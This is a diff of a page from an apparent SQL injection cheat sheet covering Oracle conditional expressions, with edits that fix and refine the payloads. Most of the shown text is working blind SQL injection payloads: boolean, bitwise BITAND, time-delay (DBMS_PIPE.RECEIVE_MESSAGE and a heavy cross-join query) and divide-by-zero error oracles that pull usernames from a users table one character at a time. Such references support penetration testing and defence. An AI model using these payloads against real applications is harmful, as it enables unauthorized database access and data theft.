@@ -4,7 +4,7 @@ description: Using Oracle conditional expressions for SQL injection attacks
 category: Injection Techniques
 order: 10
 tags: ["conditional", "boolean", "case", "decode"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Conditional statements are fundamental for extracting information from Oracle databases, especially in blind SQL injection scenarios. Oracle provides several methods for implementing conditional logic, which can be leveraged to infer data even when direct output is not available.
@@ -17,7 +17,7 @@ Oracle supports standard conditional operators and expressions:
 | ------------------ | ----------------------------------------------- | ----------------------------------------------------------------- |
 | `CASE`             | Evaluates conditions and returns values         | `CASE WHEN condition THEN result1 ELSE result2 END`               |
 | `DECODE`           | Compares expressions and returns matching value | `DECODE(expression, search1, result1, search2, result2, default)` |
-| `IF-THEN-ELSE`     | PL/SQL conditional logic                        | `IF condition THEN action1; ELSE action2; END IF;`                |
+| `IF-THEN-ELSE`     | PL/SQL only; not available inside a query       | `IF condition THEN action1; ELSE action2; END IF;`                |
 | `AND`, `OR`, `NOT` | Logical operators                               | `condition1 AND condition2`                                       |
 
 ## Boolean-Based Injection
@@ -67,41 +67,46 @@ DECODE is Oracle's proprietary conditional function:
 
 ## Combining with Time Delays
 
+An `AND` payload only runs when the original condition is true: Oracle skips the rest of an `AND` once the first part is false. The examples inject after a valid value (`admin'`); with no known value, use an `OR` form instead.
+
 Conditional expressions become particularly useful when combined with time delays in blind scenarios:
 
 ```sql
 -- Time delay triggered on condition
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
 
 -- Extract data with time-based feedback
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
+admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
 ```
 
 ## SQL Injection Examples
 
 ### Boolean Blind Extraction
 
+Testing one bit per request needs 7 requests per character instead of up to 95. Oracle has no `&` operator; use `BITAND()`:
+
 ```sql
--- Testing each bit of a character (faster than testing each possible ASCII value)
-' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 1)=1--
-' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 2)=2--
-' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 4)=4--
+' OR BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)),1)=1--
+' OR BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)),2)=2--
+' OR BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)),4)=4--
 ```
 
 ### Time-Based Blind Extraction
 
 ```sql
--- Using dbms_pipe.receive_message
-' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
+-- Using DBMS_PIPE.RECEIVE_MESSAGE
+admin' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
 
--- Using alternative delay function (dbms_lock.sleep)
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN dbms_lock.sleep(10) ELSE dbms_lock.sleep(0) END)=0--
+-- Without delay functions: a heavy query that only runs when the condition is true
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b) ELSE 0 END)>=0--
 ```
 
-### Inferring Multiple Bits
+`DBMS_LOCK.SLEEP` cannot be used here: it is a procedure, and procedures cannot be called from a query. See [Timing](/oracle/timing) for the available delay methods and their privileges.
+
+### Testing Ranges
 
 ```sql
--- Testing multiple bits at once
+-- Testing a range of values at once (lowercase letter?)
 ' OR (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) BETWEEN 97 AND 122) THEN 1 ELSE 0 END)=1--
 ```
 
@@ -150,9 +155,11 @@ Oracle's regular expression support can be combined with conditionals:
     THEN 1 ELSE 0 END)=1--
 ```
 
-## Error Handling in Conditionals
+## Errors as a Condition Signal
+
+When true and false pages look the same but errors are visible, a division by zero in the false branch turns the condition into an error/no-error signal:
 
 ```sql
--- Using exception handling with conditions
+-- Raises ORA-01476 (divisor is equal to zero) when 'admin' does not exist
 ' OR (CASE WHEN (SELECT 1 FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='admin'))=1 THEN 1 ELSE 1/0 END)=1--
 ```
